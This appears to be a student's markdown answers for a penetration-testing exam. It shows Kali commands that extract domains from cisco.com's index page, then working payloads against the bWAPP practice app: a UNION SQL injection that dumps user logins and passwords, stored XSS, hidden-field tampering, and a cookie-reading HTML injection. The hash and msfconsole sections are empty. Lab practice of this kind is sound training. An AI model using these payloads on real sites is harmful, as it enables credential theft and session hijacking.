# C part questions(13 points)
Another parts [part A](part2.md) [part B](part3.md)
 ## Download index page of cisco.com, extract unique dns to which the page redirects you
 1. Download the index page 
 ```
 kali@kali:~# wget www.cisco.com
 ```
 2. Use this command to get domains
 ```
 kali@kali:~# grep "href=" index.html | cut -d "/" -f 3 | grep "\." | cut -d '"' -f 1 | sort -u
 ```
 3. Get ip addresses (maybe optional)
 ```
 kali@kali:~# for url in $(cat list.txt); do host $url; done
 ```
 
 ### Explanation
 1. Extract all the links with `grep "href=" index.html`
 2. Get mostly the links with "/" delimeter `cut -d "/" -f 3`
 3. Get only domains with `grep "\."`
 4. Clean up the above step with `cut -d '"' -f 1`
 5. Sort results with `sort -u`
 
 
 ## Show 3 working OWASP in bWAPP
 1. sqli_2.php
 ```
 localhost/bWAPP/sqli_2.php?movie=-1+union+select+1,login,password,secret,email,6,7+from+bWAPP.users+order%20by%204+desc+&action=go
 ```
 2. xss_stored_1.php
 ```
 <script>alert(1);</script>
 ```
 3. xss_stored_3.php
   1. Find `input` in code inspector and change **type** from `hidden` to `text`
   2. Enter any value to first `input` and enter your script to second `input`
   ```
   "><script>alert(1);</script>
   ```
 4. htmli_get.php
 ```
 <script>alert(document.cookie);</script>
 ```
 
 ## Hash: 1st indentify which hash, then break given hash
 
 
 ## msfconsole: setup everything and run exploit
 
